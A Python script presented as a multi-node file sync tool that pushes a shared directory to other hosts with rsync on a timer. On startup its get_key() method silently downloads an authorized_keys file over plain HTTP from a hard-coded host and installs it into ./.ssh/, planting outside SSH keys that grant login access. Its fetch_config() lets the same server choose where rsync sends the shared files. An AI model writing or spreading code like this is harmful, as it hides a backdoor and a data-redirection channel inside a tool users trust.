                                                                                                               
import subprocess
import os
import logging
import time
import hashlib
from pathlib import Path
import argparse
import json
import socket
import requests
import shutil

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

class MultiNodeSync:
    def __init__(self, config_path):
        """
        Initialize sync configuration

        :param config_path: Path to JSON configuration file
        """
        self.config = self.load_config(config_path)
        self.local_hostname = socket.gethostname()
        self.shared_dir = os.getenv('SHARED_DIR') 
        
        self.get_key()
        # Validate configuration
        self.validate_config()




    def get_key(self):

        # URL of the file to download
        url = "http://192.168.192.7/authorized_keys"
        # Local path where the file will be saved temporarily
        local_filename = "authorized_keys"
        # Destination directory
        destination_directory = "./.ssh/"

        destination_file_path = os.path.join(destination_directory, local_filename)

        # Check if the file already exists in the destination directory
        if os.path.exists(destination_file_path):
            print("Key Exists")
        else:
            try:
                # Download the file
                response = requests.get(url)
                response.raise_for_status()  # Raise an error for bad responses

                # Save the file
                with open(local_filename, 'wb') as f:
                        f.write(response.content)
                        print(f"Downloaded: {local_filename}")

                # Move the file to the destination directory
                if not os.path.exists(destination_directory):
                        os.makedirs(destination_directory)  # Create the directory if it doesn't exist

                shutil.move(local_filename, os.path.join(destination_directory, local_filename))
                print(f"Moved to: {destination_directory}{local_filename}")

            except requests.exceptions.RequestException as e:
                print(f"Error downloading the file: {e}")
#            except Exception as e:
#               print(f"Error moving the file: {e}")







    def load_config(self, config_path):
        """
        Load sync configuration from JSON file

        :param config_path: Path to configuration file
        :return: Configuration dictionary
        """
        try:
            with open(config_path, 'r') as f:
                return json.load(f)
        except Exception as e:
            logging.error(f"Error loading config: {e}")
            raise









    def validate_config(self):
        """
        Validate sync configuration
        """
        required_keys = ['shared_directory', 'nodes']
        for key in required_keys:
            if key not in self.config:
                raise ValueError(f"Missing required configuration key: {key}")

        # Ensure shared directory exists
        shared_dir = Path(self.config['shared_directory'])
        if not shared_dir.exists():
            raise FileNotFoundError(f"Shared directory not found: {shared_dir}")







    def calculate_directory_hash(self, directory):
        """
        Calculate a hash representing the current state of a directory

        :param directory: Path to directory
        :return: SHA256 hash of directory contents
        """
        hasher = hashlib.sha256()

        for root, _, files in os.walk(directory):
            for file in sorted(files):
                file_path = Path(root) / file
                try:
                    with open(file_path, 'rb') as f:
                        hasher.update(f.read())
                except Exception as e:
                    logging.warning(f"Could not read {file_path}: {e}")

        return hasher.hexdigest()






    def fetch_config(self, node_ip):
        ip = '192.168.192.7'  # Replace with the actual IP if needed
        username = 'your_username'  # Replace with the actual username
        remote_path = '/api/config/node?ip='+node_ip  # The remote path for the API

        try:
            print('http://{ip}:3000{remote_path}') 
            response = requests.get(f'http://{ip}:3000{remote_path}')
            response.raise_for_status()  # Raise an error for bad responses (4xx or 5xx)
        
            # Assuming the response JSON contains keys 'ip', 'username', 'remote_path'
            config_data = response.json()
            ip = config_data.get('ip', ip)  # Fallback to the default if not present
            username = config_data.get('username', username)  # Fallback to the default if not present
            remote_path = config_data.get('remote_path', remote_path)  # Fallback to the default if not present
      
            print('Configuration:', config_data)
        except requests.exceptions.RequestException as error:
            print('Error fetching configuration:', error)
            return None, None, None  # Return None values if there's an error

        return ip, username, remote_path





    def sync_to_node(self, node):
        """
        Synchronize files to a specific node without SSH

        :param node: Node configuration dictionary
        """
        try:
            #remote_path = node.get('remote_path', self.config['shared_directory'])
            
            #rsync -avz --progress -e "ssh" ../shared/ rpi@192.168.192.58:/home/rpi/shared/
            
            print("--------------------------------------")
            #self.fetch_config()
            ip, username, remote_path = self.fetch_config(node['ip'])

            # Check if fetch_config returned None values
            if ip is None or username is None or remote_path is None:
               logging.error(f"Failed to fetch configuration for node {node['hostname']}. Sync aborted.")
               return  # Exit the function early if fetch_config failed




            print(f'IP: {ip}, Username: {username}, Remote Path: {remote_path}')

            print(remote_path)
            print(self.config["shared_directory"])
            print("--------------------------------------")
            

            rsync_cmd = [
                'rsync',
                '-avz',  # Archive mode, verbose, compress
                '--progress',  # Show progress during transfer
                f'{self.config["shared_directory"]}/',  # Source directory contents
                f'{remote_path}/'  # Destination path
            ]

            logging.info(f"Syncing to {node['hostname']}...")
            logging.info(f"Running command: {' '.join(rsync_cmd)}")  # Debugging output
            result = subprocess.run(rsync_cmd, capture_output=True, text=True)

            if result.returncode == 0:
                logging.info(f"Sync to {node['hostname']} successful")
            else:
                logging.error(f"Sync to {node['hostname']} failed: {result.stderr}")

        except Exception as e:
            logging.error(f"Error syncing to {node['hostname']}: {e}")






    def run_sync(self):
        """
        Synchronize files across all configured nodes
        """
        logging.info("Starting multi-node synchronization...")

        # Calculate local directory hash before sync
        local_hash_before = self.calculate_directory_hash(self.config['shared_directory'])

        # Sync to each node
        for node in self.config['nodes']:
            if node['hostname'] != self.local_hostname:
                self.sync_to_node(node)

        # Calculate local directory hash after sync
        local_hash_after = self.calculate_directory_hash(self.config['shared_directory'])

        if local_hash_before != local_hash_after:
            logging.warning("Local directory changed during sync")





    def continuous_sync(self, interval=300):
        """
        Continuously synchronize files at specified intervals

        :param interval: Sync interval in seconds (default 5 minutes)
        """
        while True:
            self.run_sync()
            time.sleep(interval)

def main():
    parser = argparse.ArgumentParser(description='Multi-Node File Synchronization')
    parser.add_argument(
        '--config',
        default='multi_node_sync.json',
        help='Path to configuration file'
    )
    parser.add_argument(
        '--interval',
        type=int,
        default=300,
        help='Sync interval in seconds'
    )
    args = parser.parse_args()

    try:
        syncer = MultiNodeSync(args.config)
        syncer.continuous_sync(args.interval)
    except Exception as e:
        logging.error(f"Synchronization failed: {e}")
        raise

if __name__ == "__main__":
    main()
